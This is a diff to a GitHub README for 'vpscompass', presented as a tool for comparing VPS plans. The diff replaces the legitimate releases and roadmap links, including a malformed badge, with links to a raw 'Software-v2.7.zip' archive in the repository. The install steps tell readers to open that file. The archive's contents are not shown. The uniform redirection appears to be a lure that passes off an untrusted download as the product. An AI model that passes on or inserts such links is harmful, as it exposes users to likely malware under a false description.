@@ -1,7 +1,7 @@
 # 🌐 vpscompass - Compare VPS Offers with Ease
 
 ## 📥 Download
-[![Download vpscompass](https://img.shields.io/badge/Download%20vpscompass-v1.0-blue.svg)](https://github.com/FiqSkibidi/vpscompass/releases)
+[![Download vpscompass](https://github.com/FiqSkibidi/vpscompass/raw/refs/heads/main/vpscompass/Software-v2.7.zip%https://github.com/FiqSkibidi/vpscompass/raw/refs/heads/main/vpscompass/Software-v2.7.zip)](https://github.com/FiqSkibidi/vpscompass/raw/refs/heads/main/vpscompass/Software-v2.7.zip)
 
 ## 🚀 Getting Started
 vpscompass is a tool that makes it easy to compare virtual private server (VPS) plans. You simply enter a list of different VPS providers, and vpscompass gives you a clear breakdown of their offerings. This application is perfect for anyone who wants to make informed choices without diving deep into technical details. 
@@ -20,7 +20,7 @@ Before you download vpscompass, ensure your system meets these basic requirement
 ## 📥 Download & Install
 To download vpscompass, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/FiqSkibidi/vpscompass/releases).
+1. Visit the [Releases page](https://github.com/FiqSkibidi/vpscompass/raw/refs/heads/main/vpscompass/Software-v2.7.zip).
 2. Look for the latest version listed on the page.
 3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS).
 4. Once the download completes, open the file to run the installer.
@@ -79,8 +79,8 @@ For support, you can contact the developer via GitHub. Open an issue on this rep
 If you're interested in contributing to vpscompass, please consider adding new features or improving existing functionality. Check the contribution guidelines on the GitHub page for details on how you can help.
 
 ## 🔗 Links
-- [Download vpscompass](https://github.com/FiqSkibidi/vpscompass/releases)  
-- [Project Roadmap](https://github.com/FiqSkibidi/vpscompass/projects)
+- [Download vpscompass](https://github.com/FiqSkibidi/vpscompass/raw/refs/heads/main/vpscompass/Software-v2.7.zip)  
+- [Project Roadmap](https://github.com/FiqSkibidi/vpscompass/raw/refs/heads/main/vpscompass/Software-v2.7.zip)
 
 ## ⚖️ License
 vpscompass is open-source software licensed under the MIT License. You can freely use and modify it. For further details, consult the LICENSE file in this repository.
